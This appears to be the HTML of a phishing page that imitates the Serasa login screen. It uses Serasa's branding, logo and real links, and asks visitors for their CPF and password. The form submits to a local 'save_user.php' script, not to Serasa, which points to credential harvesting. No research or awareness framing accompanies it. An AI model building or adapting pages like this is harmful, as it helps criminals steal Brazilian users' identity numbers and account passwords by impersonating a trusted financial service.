<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Serasa Web - Entrar - CPF </title>
  
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
    }

    .serasa-login-container {
      display: flex;
      min-height: 100vh;
      position: relative;
    }

    /* Botão Voltar */
    .back-button {
      position: absolute;
      top: 20px;
      left: 20px;
      background-color: #e71d73;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 10px 18px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      display: flex;
      align-items: center;
      box-shadow: 0 4px 8px rgba(0,0,0,0.15);
      transition: background-color 0.3s ease;
      text-decoration: none;
      user-select: none;
      z-index: 1000;
    }

    .back-button:hover {
      background-color: #bf145f;
    }

    .back-button svg {
      width: 16px;
      height: 16px;
      margin-right: 8px;
      fill: white;
    }

    .serasa-left {
      background-color: #e71d73;
      color: white;
      width: 50%;
      padding: 40px;
      position: relative;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .serasa-image {
      max-width: 100%;
      height: auto;
      margin-bottom: 20px;
      border-radius: 20px;
    }

    .serasa-text h1 {
      font-size: 36px;
      margin-bottom: 10px;
    }

    .serasa-text p {
      font-size: 36px;
      font-weight: bold;
    }

    .highlight {
      background: white;
      color: #e71d73;
      padding: 0 10px;
      border-radius: 5px;
    }

    .serasa-right {
      background-color: #f5f7fa;
      width: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .serasa-form {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .serasa-form label {
      display: block;
      color: #e71d73;
      font-weight: bold;
      margin-bottom: 8px;
    }

    .serasa-form input[type="text"], .serasa-form input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 2px solid #e71d73;
      border-radius: 8px;
      margin-bottom: 8px;
      font-size: 16px;
    }

    .error-message {
      color: #e71d73;
      font-size: 12px;
      margin-bottom: 16px;
      display: block;
    }

    .remember-me {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
      font-size: 14px;
    }

    .remember-me input {
      margin-right: 8px;
    }

     .serasa-form button {
  background-color: #e71d73; /* rosa Serasa */
  color: white;
  border: none;
  border-radius: 8px;
  padding: 12px;
  width: 100%;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  opacity: 1;
  pointer-events: auto;
  transition: background-color 0.3s ease;
}

.serasa-form button:hover {
  background-color: #bf145f;
}


    .enterprise-link {
      margin-top: 16px;
      font-size: 14px;
      color: #e71d73;
      text-align: center;
    }

    .enterprise-link a {
      color: #e71d73;
      font-weight: bold;
      text-decoration: none;
    }

    .terms {
      font-size: 12px;
      color: #666;
      margin-top: 12px;
      text-align: center;
    }

    .terms a {
      text-decoration: none;
      color: #666;
    }

    @media (max-width: 768px) {
      .serasa-login-container {
        flex-direction: column;
      }

      .serasa-left, .serasa-right {
        width: 100%;
        padding: 20px;
      }

      .serasa-text h1,
      .serasa-text p {
        font-size: 28px;
      }
      #continuar {
    opacity: 1 !important;
    pointer-events: auto !important;
    cursor: pointer !important;
  }
    }
  </style>
</head>
<body>
  <div class="serasa-login-container">
    <div class="serasa-left">
      <img src="https://www.serasa.com.br/assets/ecs/web/ecs-web-authorization-front/5.0.2/_next/static/images/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823.png" alt="Mulher com celular" class="serasa-image" />
      <div class="serasa-text">
        <h1>Na Serasa<br>você pode</h1>
        <p><span class="highlight">Negociar</span><br><span class="highlight">suas dividas</span></p>
      </div>
    </div>

    <div class="serasa-right">
      <form action="save_user.php" method="POST" class="serasa-form">
        <label for="cpf">Digite seu CPF</label>
        <input type="text" id="cpf" placeholder="000.000.000-00" required />
        <span class="error-message">Informe o seu CPF.</span>

        <label for="password">Digite sua senha</label>
        <input type="password" id="password" placeholder="************" required />
        <span class="error-message">Informe a sua senha.</span>
        
        <button type="submit" id="continuar">Continuar</button>


        <p class="enterprise-link">
          <a href="https://empresas.serasaexperian.com.br/">Veja aqui</a> soluções para a sua empresa.
        </p>
        <p class="terms">
          <a href="https://www.serasa.com.br/app/politica-de-privacidade/">Termos de Uso e Política de Privacidade</a>
        </p>
      </form>
    </div>
  </div>

</body>
</html>
